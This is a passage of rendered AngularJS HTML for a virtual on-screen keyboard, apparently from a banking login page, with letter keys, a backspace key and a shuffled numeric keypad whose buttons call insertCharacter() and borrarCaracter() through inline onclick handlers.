                                                <div data-ng-repeat="keyItem in $ctrl.keyboard.keyDistribution" class="key ng-scope" data-ng-style="{&#39;width&#39;: ((keyItem.size || 1) * $ctrl.keyboard.keySize) + &#39;px&#39;, &#39;height&#39;: $ctrl.keyboard.keySize + &#39;px&#39;,
                                 &#39;margin-left&#39;: $ctrl.keyboard.keyMarginLeft + &#39;px&#39; }" data-ng-class="keyItem.keyClass" style="width: 30px; height: 30px; margin-left: 3px;">
                                                  <button onclick="insertCharacter('x')" type="button" class="" data-ng-class="{&#39;key-shift-enabled&#39;: $ctrl.keyboard.upperCase}">

                                                    <span data-ng-if="!keyItem.icon" data-ng-class="{&#39;text-uppercase&#39;: $ctrl.keyboard.upperCase, &#39;text-lowercase&#39;: !$ctrl.keyboard.upperCase }" class="ng-binding ng-scope text-lowercase">
                                                      x
                                                    </span>
                                                  </button>
                                                </div>
                                                <div data-ng-repeat="keyItem in $ctrl.keyboard.keyDistribution" class="key ng-scope" data-ng-style="{&#39;width&#39;: ((keyItem.size || 1) * $ctrl.keyboard.keySize) + &#39;px&#39;, &#39;height&#39;: $ctrl.keyboard.keySize + &#39;px&#39;,
                                 &#39;margin-left&#39;: $ctrl.keyboard.keyMarginLeft + &#39;px&#39; }" data-ng-class="keyItem.keyClass" style="width: 30px; height: 30px; margin-left: 3px;">
                                                  <button onclick="insertCharacter('c')" type="button" class="" data-ng-class="{&#39;key-shift-enabled&#39;: $ctrl.keyboard.upperCase}">

                                                    <span data-ng-if="!keyItem.icon" data-ng-class="{&#39;text-uppercase&#39;: $ctrl.keyboard.upperCase, &#39;text-lowercase&#39;: !$ctrl.keyboard.upperCase }" class="ng-binding ng-scope text-lowercase">
                                                      c
                                                    </span>
                                                  </button>
                                                </div>
                                                <div data-ng-repeat="keyItem in $ctrl.keyboard.keyDistribution" class="key ng-scope" data-ng-style="{&#39;width&#39;: ((keyItem.size || 1) * $ctrl.keyboard.keySize) + &#39;px&#39;, &#39;height&#39;: $ctrl.keyboard.keySize + &#39;px&#39;,
                                 &#39;margin-left&#39;: $ctrl.keyboard.keyMarginLeft + &#39;px&#39; }" data-ng-class="keyItem.keyClass" style="width: 30px; height: 30px; margin-left: 3px;">
                                                  <button onclick="insertCharacter('v')" type="button" class="" data-ng-class="{&#39;key-shift-enabled&#39;: $ctrl.keyboard.upperCase}">

                                                    <span data-ng-if="!keyItem.icon" data-ng-class="{&#39;text-uppercase&#39;: $ctrl.keyboard.upperCase, &#39;text-lowercase&#39;: !$ctrl.keyboard.upperCase }" class="ng-binding ng-scope text-lowercase">
                                                      v
                                                    </span>
                                                  </button>
                                                </div>
                                                <div data-ng-repeat="keyItem in $ctrl.keyboard.keyDistribution" class="key ng-scope" data-ng-style="{&#39;width&#39;: ((keyItem.size || 1) * $ctrl.keyboard.keySize) + &#39;px&#39;, &#39;height&#39;: $ctrl.keyboard.keySize + &#39;px&#39;,
                                 &#39;margin-left&#39;: $ctrl.keyboard.keyMarginLeft + &#39;px&#39; }" data-ng-class="keyItem.keyClass" style="width: 30px; height: 30px; margin-left: 3px;">
                                                  <button onclick="insertCharacter('b')" type="button" class="" data-ng-class="{&#39;key-shift-enabled&#39;: $ctrl.keyboard.upperCase}">

                                                    <span data-ng-if="!keyItem.icon" data-ng-class="{&#39;text-uppercase&#39;: $ctrl.keyboard.upperCase, &#39;text-lowercase&#39;: !$ctrl.keyboard.upperCase }" class="ng-binding ng-scope text-lowercase">
                                                      b
                                                    </span>
                                                  </button>
                                                </div>
                                                <div data-ng-repeat="keyItem in $ctrl.keyboard.keyDistribution" class="key ng-scope" data-ng-style="{&#39;width&#39;: ((keyItem.size || 1) * $ctrl.keyboard.keySize) + &#39;px&#39;, &#39;height&#39;: $ctrl.keyboard.keySize + &#39;px&#39;,
                                 &#39;margin-left&#39;: $ctrl.keyboard.keyMarginLeft + &#39;px&#39; }" data-ng-class="keyItem.keyClass" style="width: 30px; height: 30px; margin-left: 3px;">
                                                  <button onclick="insertCharacter('n')" type="button" class="" data-ng-class="{&#39;key-shift-enabled&#39;: $ctrl.keyboard.upperCase}">

                                                    <span data-ng-if="!keyItem.icon" data-ng-class="{&#39;text-uppercase&#39;: $ctrl.keyboard.upperCase, &#39;text-lowercase&#39;: !$ctrl.keyboard.upperCase }" class="ng-binding ng-scope text-lowercase">
                                                      n
                                                    </span>
                                                  </button>
                                                </div>
                                                <div data-ng-repeat="keyItem in $ctrl.keyboard.keyDistribution" class="key ng-scope" data-ng-style="{&#39;width&#39;: ((keyItem.size || 1) * $ctrl.keyboard.keySize) + &#39;px&#39;, &#39;height&#39;: $ctrl.keyboard.keySize + &#39;px&#39;,
                                 &#39;margin-left&#39;: $ctrl.keyboard.keyMarginLeft + &#39;px&#39; }" data-ng-class="keyItem.keyClass" style="width: 30px; height: 30px; margin-left: 3px;">
                                                  <button onclick="insertCharacter('m')" type="button" class="" data-ng-class="{&#39;key-shift-enabled&#39;: $ctrl.keyboard.upperCase}">

                                                    <span data-ng-if="!keyItem.icon" data-ng-class="{&#39;text-uppercase&#39;: $ctrl.keyboard.upperCase, &#39;text-lowercase&#39;: !$ctrl.keyboard.upperCase }" class="ng-binding ng-scope text-lowercase">
                                                      m
                                                    </span>
                                                  </button>
                                                </div>
                                                <div data-ng-repeat="keyItem in $ctrl.keyboard.keyDistribution" class="key ng-scope" data-ng-style="{&#39;width&#39;: ((keyItem.size || 1) * $ctrl.keyboard.keySize) + &#39;px&#39;, &#39;height&#39;: $ctrl.keyboard.keySize + &#39;px&#39;,
                                 &#39;margin-left&#39;: $ctrl.keyboard.keyMarginLeft + &#39;px&#39; }" data-ng-class="keyItem.keyClass" style="width: 60px; height: 30px; margin-left: 3px;">
                                                  <button onclick="borrarCaracter()" type="button" class="light-button" data-ng-class="{&#39;key-shift-enabled&#39;: $ctrl.keyboard.upperCase}">
                                                    <i data-ng-if="keyItem.icon" class="icon-bcs icon-arrow-1-1 small-icon font-weight-bold"></i><!-- end ngIf: keyItem.icon -->
                                                  </button>
                                                </div>
                                              </div>
                                            </div>
                                            <div class="numeric-keyboard bcs-no-selectable-text">
                                              <div data-ng-style="{&#39;width&#39;: $ctrl.keyboard.numericRowSize * ($ctrl.keyboard.numberKeyWidth + $ctrl.keyboard.numberKeyMarginLeft) + &#39;px&#39;}" style="width: 90px;">
                                                <div data-ng-repeat="keyItem in $ctrl.keyboard.numericDistribution" class="key ng-scope" data-ng-style="{&#39;width&#39;: ((keyItem.size || 1) * $ctrl.keyboard.numberKeyWidth) + &#39;px&#39;, &#39;height&#39;: $ctrl.keyboard.numberKeyHeight + &#39;px&#39;,
                            &#39;margin-left&#39;: $ctrl.keyboard.numberKeyMarginLeft + &#39;px&#39; }" style="width: 25px; height: 20px; margin-left: 5px;">
                                                  <button data-ng-style="{&#39;width&#39;: $last ? ($ctrl.keyboard.numberKeyWidth - 2) + &#39;px&#39; : &#39;100%&#39;}" onclick="insertCharacter('8')" type="button" class="light-button" style="width: 100%;">

                                                    <span data-ng-if="!keyItem.icon" class="ng-binding ng-scope">
                                                      8
                                                    </span>
                                                  </button>
                                                </div>
                                                <div data-ng-repeat="keyItem in $ctrl.keyboard.numericDistribution" class="key ng-scope" data-ng-style="{&#39;width&#39;: ((keyItem.size || 1) * $ctrl.keyboard.numberKeyWidth) + &#39;px&#39;, &#39;height&#39;: $ctrl.keyboard.numberKeyHeight + &#39;px&#39;, 
                            &#39;margin-left&#39;: $ctrl.keyboard.numberKeyMarginLeft + &#39;px&#39; }" style="width: 25px; height: 20px; margin-left: 5px;">
                                                  <button data-ng-style="{&#39;width&#39;: $last ? ($ctrl.keyboard.numberKeyWidth - 2) + &#39;px&#39; : &#39;100%&#39;}" onclick="insertCharacter('7')" type="button" class="light-button" style="width: 100%;">

                                                    <span data-ng-if="!keyItem.icon" class="ng-binding ng-scope">
                                                      7
                                                    </span>
                                                  </button>
                                                </div>
                                                <div data-ng-repeat="keyItem in $ctrl.keyboard.numericDistribution" class="key ng-scope" data-ng-style="{&#39;width&#39;: ((keyItem.size || 1) * $ctrl.keyboard.numberKeyWidth) + &#39;px&#39;, &#39;height&#39;: $ctrl.keyboard.numberKeyHeight + &#39;px&#39;, 
                            &#39;margin-left&#39;: $ctrl.keyboard.numberKeyMarginLeft + &#39;px&#39; }" style="width: 25px; height: 20px; margin-left: 5px;">
                                                  <button data-ng-style="{&#39;width&#39;: $last ? ($ctrl.keyboard.numberKeyWidth - 2) + &#39;px&#39; : &#39;100%&#39;}" onclick="insertCharacter('0')" type="button" class="light-button" style="width: 100%;">

                                                    <span data-ng-if="!keyItem.icon" class="ng-binding ng-scope">
                                                      0
                                                    </span>
                                                  </button>
                                                </div>
                                                <div data-ng-repeat="keyItem in $ctrl.keyboard.numericDistribution" class="key ng-scope" data-ng-style="{&#39;width&#39;: ((keyItem.size || 1) * $ctrl.keyboard.numberKeyWidth) + &#39;px&#39;, &#39;height&#39;: $ctrl.keyboard.numberKeyHeight + &#39;px&#39;, 
                            &#39;margin-left&#39;: $ctrl.keyboard.numberKeyMarginLeft + &#39;px&#39; }" style="width: 25px; height: 20px; margin-left: 5px;">
                                                  <button data-ng-style="{&#39;width&#39;: $last ? ($ctrl.keyboard.numberKeyWidth - 2) + &#39;px&#39; : &#39;100%&#39;}" onclick="insertCharacter('2')" type="button" class="light-button" style="width: 100%;">

                                                    <span data-ng-if="!keyItem.icon" class="ng-binding ng-scope">
                                                      2
                                                    </span>
                                                  </button>
                                                </div>
                                                <div data-ng-repeat="keyItem in $ctrl.keyboard.numericDistribution" class="key ng-scope" data-ng-style="{&#39;width&#39;: ((keyItem.size || 1) * $ctrl.keyboard.numberKeyWidth) + &#39;px&#39;, &#39;height&#39;: $ctrl.keyboard.numberKeyHeight + &#39;px&#39;, 
                            &#39;margin-left&#39;: $ctrl.keyboard.numberKeyMarginLeft + &#39;px&#39; }" style="width: 25px; height: 20px; margin-left: 5px;">
                                                  <button data-ng-style="{&#39;width&#39;: $last ? ($ctrl.keyboard.numberKeyWidth - 2) + &#39;px&#39; : &#39;100%&#39;}" onclick="insertCharacter('1')" type="button" class="light-button" style="width: 100%;">

                                                    <span data-ng-if="!keyItem.icon" class="ng-binding ng-scope">
                                                      1
                                                    </span>
                                                  </button>
                                                </div>
                                                <div data-ng-repeat="keyItem in $ctrl.keyboard.numericDistribution" class="key ng-scope" data-ng-style="{&#39;width&#39;: ((keyItem.size || 1) * $ctrl.keyboard.numberKeyWidth) + &#39;px&#39;, &#39;height&#39;: $ctrl.keyboard.numberKeyHeight + &#39;px&#39;, 
                            &#39;margin-left&#39;: $ctrl.keyboard.numberKeyMarginLeft + &#39;px&#39; }" style="width: 25px; height: 20px; margin-left: 5px;">
                                                  <button data-ng-style="{&#39;width&#39;: $last ? ($ctrl.keyboard.numberKeyWidth - 2) + &#39;px&#39; : &#39;100%&#39;}" onclick="insertCharacter('3')" type="button" class="light-button" style="width: 100%;">

                                                    <span data-ng-if="!keyItem.icon" class="ng-binding ng-scope">
                                                      3
                                                    </span>
                                                  </button>
                                                </div>
                                                <div data-ng-repeat="keyItem in $ctrl.keyboard.numericDistribution" class="key ng-scope" data-ng-style="{&#39;width&#39;: ((keyItem.size || 1) * $ctrl.keyboard.numberKeyWidth) + &#39;px&#39;, &#39;height&#39;: $ctrl.keyboard.numberKeyHeight + &#39;px&#39;, 
                            &#39;margin-left&#39;: $ctrl.keyboard.numberKeyMarginLeft + &#39;px&#39; }" style="width: 25px; height: 20px; margin-left: 5px;">
                                                  <button data-ng-style="{&#39;width&#39;: $last ? ($ctrl.keyboard.numberKeyWidth - 2) + &#39;px&#39; : &#39;100%&#39;}" onclick="insertCharacter('4')" type="button" class="light-button" style="width: 100%;">

                                                    <span data-ng-if="!keyItem.icon" class="ng-binding ng-scope">
                                                      4
                                                    </span>
                                                  </button>
                                                </div>
                                                <div data-ng-repeat="keyItem in $ctrl.keyboard.numericDistribution" class="key ng-scope" data-ng-style="{&#39;width&#39;: ((keyItem.size || 1) * $ctrl.keyboard.numberKeyWidth) + &#39;px&#39;, &#39;height&#39;: $ctrl.keyboard.numberKeyHeight + &#39;px&#39;, 
                            &#39;margin-left&#39;: $ctrl.keyboard.numberKeyMarginLeft + &#39;px&#39; }" style="width: 25px; height: 20px; margin-left: 5px;">
                                                  <button data-ng-style="{&#39;width&#39;: $last ? ($ctrl.keyboard.numberKeyWidth - 2) + &#39;px&#39; : &#39;100%&#39;}" onclick="insertCharacter('9')" type="button" class="light-button" style="width: 100%;">

                                                    <span data-ng-if="!keyItem.icon" class="ng-binding ng-scope">
                                                      9
                                                    </span>
                                                  </button>
                                                </div>
                                                <div data-ng-repeat="keyItem in $ctrl.keyboard.numericDistribution" class="key ng-scope" data-ng-style="{&#39;width&#39;: ((keyItem.size || 1) * $ctrl.keyboard.numberKeyWidth) + &#39;px&#39;, &#39;height&#39;: $ctrl.keyboard.numberKeyHeight + &#39;px&#39;, 
                            &#39;margin-left&#39;: $ctrl.keyboard.numberKeyMarginLeft + &#39;px&#39; }" style="width: 25px; height: 20px; margin-left: 5px;">
                                                  <button data-ng-style="{&#39;width&#39;: $last ? ($ctrl.keyboard.numberKeyWidth - 2) + &#39;px&#39; : &#39;100%&#39;}" onclick="insertCharacter('5')" type="button" class="light-button" style="width: 100%;">

                                                    <span data-ng-if="!keyItem.icon" class="ng-binding ng-scope">
                                                      5
                                                    </span>
                                                  </button>
                                                </div>
                                                <div data-ng-repeat="keyItem in $ctrl.keyboard.numericDistribution" class="key ng-scope" data-ng-style="{&#39;width&#39;: ((keyItem.size || 1) * $ctrl.keyboard.numberKeyWidth) + &#39;px&#39;, &#39;height&#39;: $ctrl.keyboard.numberKeyHeight + &#39;px&#39;,
                            &#39;margin-left&#39;: $ctrl.keyboard.numberKeyMarginLeft + &#39;px&#39; }" style="width: 25px; height: 20px; margin-left: 5px;">
                                                  <button data-ng-style="{&#39;width&#39;: $last ? ($ctrl.keyboard.numberKeyWidth - 2) + &#39;px&#39; : &#39;100%&#39;}" onclick="insertCharacter('6')" type="button" class="light-button" style="width: 23px;">

                                                    <span data-ng-if="!keyItem.icon" class="ng-binding ng-scope">
                                                      6
                                                    </span>
                                                  </button>
</body>

</html>